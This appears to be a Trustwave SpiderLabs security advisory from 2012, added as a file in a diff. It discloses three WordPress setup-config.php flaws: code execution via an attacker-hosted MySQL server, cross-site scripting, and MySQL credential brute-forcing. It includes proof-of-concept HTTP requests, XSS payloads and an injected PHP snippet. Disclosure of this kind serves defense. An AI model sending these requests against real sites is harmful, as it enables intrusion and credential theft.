@@ -1,0 +1,284 @@
+Trustwave's SpiderLabs Security Advisory TWSL2012-002:
+Multiple Vulnerabilities in WordPress
+
+https://www.trustwave.com/spiderlabs/advisories/TWSL2012-002.txt
+
+Published: 1/24/12
+Version: 1.0
+
+Vendor: WordPress (http://wordpress.org/)
+Product: WordPress
+Version affected: 3.3.1 and prior
+
+Product description:
+WordPress is a free and open source blogging tool and publishing platform
+powered by PHP and MySQL.
+
+Credit: Jonathan Claudius of Trustwave SpiderLabs
+
+Finding 1: PHP Code Execution and Persistent Cross Site Scripting
+Vulnerabilities via 'setup-config.php' page.
+CVE: CVE-2011-4899
+
+The WordPress 'setup-config.php' installation page allows users to install
+WordPress in local or remote MySQL databases. This typically requires a user
+to have valid MySQL credentials to complete.  However, a malicious user can
+host their own MySQL database server and can successfully complete the
+WordPress installation without having valid credentials on the target system.
+
+After the successful installation of WordPress, a malicious user can inject
+malicious PHP code via the WordPress Themes editor.  In addition, with control
+of the database store, malicious Javascript can be injected into the content
+of WordPress yielding persistent Cross Site Scripting.
+
+Proof of Concept:
+
+Servers Involved
+
+A.B.C.D = Target WordPress Web Server
+W.X.Y.Z = Malicious User's MySQL Instance
+
+1.) Malicious User hosts their own MySQL instance at W.X.Y.Z on port 3306
+
+2.) Performs POST/GET Requests to Install WordPress into MySQL Instance
+
+Request #1
+----------
+POST /wp-admin/setup-config.php?step=2 HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://A.B.C.D/wp-admin/setup-config.php?step=1
+Cookie: wp-settings-time-1=1322687480; wp-settings-1=m9%3Do
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+
+dbname=wordpress&uname=jsmith&pwd=jsmith&dbhost=W.X.Y.Z&prefix=wp_&submit=Submit
+
+Request #2
+----------
+GET /wp-admin/install.php HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://A.B.C.D/wp-admin/setup-config.php?step=2
+Cookie: wp-settings-time-1=1322687480; wp-settings-1=m9%3Do
+If-Modified-Since: Wed, 07 Dec 2011 16:03:33 GMT
+
+3.) Get PHP Code Execution
+
+Malicious user edits 404.php via Themes Editor as follows:
+
+<?php
+phpinfo();
+?>
+
+Note #1: Any php file in the theme could be used.
+Note #2: Depending settings, PHP may be used to execute system commands
+         on webserver.
+
+Malicious user performs get request of modified page to execute code.
+
+Request
+-------
+GET /wp-content/themes/default/404.php HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+
+4.) Get Persistent Cross Site Scripting
+
+Malicious User Injects Malicious Javascript into their own MySQL database instance
+
+MySQL Query
+-----------
+update wp_comments SET
+comment_content='<script>alert('123')</script>' where comment_content='Hi,
+this is a comment.<br />To delete \ a comment, just log in and view the
+post's comments. There you will have the option to edit or delete
+them.';
+
+Non-malicious User Visits Wordpress installation and has Javascript executed on their browser
+
+Request
+-------
+GET /?p=1 HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+
+
+
+Finding 2: Multiple Cross Site Scripting Vulnerabilities in
+'setup-config.php' page
+CVE: CVE-2012-0782
+
+The WordPress 'setup-config.php' installation page allows users to install
+WordPress in local or remote MySQL databases. When using this installation page
+the user is asked to supply the database name, the server that the database
+resides on, and a valid MySQL username and password.
+
+During this process, malicious users can supply javascript within
+the "dbname", "dbhost" or "uname" parameters. Upon clicking the submission
+button, the javascript is rendered in the client's browser.
+
+Proof of Concept:
+
+Servers Involved
+
+A.B.C.D = Target WordPress Web Server
+
+Request
+-------
+POST /wp-admin/setup-config.php?step=2 HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://A.B.C.D/wp-admin/setup-config.php?step=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+
+dbname=%3Cscript%3Ealert%28%27123%27%29%3C%2Fscript%3E&uname=root&pwd=&dbhost=localhost&prefix=wp_&submit=Submit
+
+
+
+Finding 3: MySQL Server Username/Password Disclosure Vulnerability via
+'setup-config.php' page
+CVE: CVE-2011-4898
+
+The WordPress 'setup-config.php' installation page allows users to install
+WordPress in local or remote MySQL databases. When using this installation page
+the user is asked to supply the database name, the server the database resides
+on, and a valid MySQL username and password.
+
+Malicious users can omit the "dbname" parameter during this process, allowing
+them to continually bruteforce MySQL instance usernames and passwords. This
+includes any local or remote MySQL instances which are accessible to the
+target web server. This can also be used as a method to proxy MySQL bruteforce
+attacks against other MySQL instances outside of the target organization.
+
+Proof of Concept:
+
+Servers Involved
+
+A.B.C.D = Target WordPress Web Server
+L.M.N.O = Any MySQL Server for which the Web Server has network access
+
+Request
+-------
+POST /wp-admin/setup-config.php?step=2 HTTP/1.1
+Host: A.B.C.D
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://A.B.C.D/wp-admin/setup-config.php?step=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+uname=mysql&pwd=mysql&dbhost=L.M.N.O
+
+Response (If Password is Valid)
+-------------------------------
+<---snip-->
+We were able to connect to the database server (which means your username
+and password is okay) but not able to select the database.
+<---snip-->
+
+Response (If Password is Invalid)
+---------------------------------
+<---snip-->
+This either means that the username and password information in your
+wp-config.php file is incorrect or we can't contact the database server at
+localhost. This could mean your host's database server is down.
+<---snip-->
+
+
+Vendor Response:
+Due to the fact that the component in question is an installation script,
+the vendor has stated that the attack surface is too small to warrant
+a fix:
+
+"We give priority to a better user experience at the install process. It is
+unlikely a user would go to the trouble of installing a copy of WordPress
+and then not finishing the setup process more-or-less immediately. The
+window of opportunity for exploiting such a vulnerability is very small."
+
+However, Trustwave SpiderLabs urges caution in situations where the
+WordPress installation script is provided as part of a default image.
+This is  often done as a convenience on hosting providers, even in
+cases where the client does not use the software. It is a best practice
+to ensure  that no installation scripts are exposed to outsiders, and
+these vulnerabilities reinforce the importance of this step.
+
+
+Remediation Steps:
+No official fix for these issues will be released for the WordPress
+publishing platform. However, administrators can mitigate these issues by
+creating strong MySQL passwords and defining rules within a web application
+firewall (WAF) solution. ModSecurity (http://www.modsecurity.org/) has
+added rules to the commercial rules feed for these issues, and Trustwave's
+vulnerability scanning solution, TrustKeeper, has been updated to detect
+exposed installation scripts.
+
+
+Vendor Communication Timeline:
+12/22/11 - Vulnerability disclosed
+01/16/12 - Confirmation to release vulnerabilities
+01/24/12 - Advisory published
+
+
+References
+1. http://www.wordpress.org
+
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave's SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
+
+This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
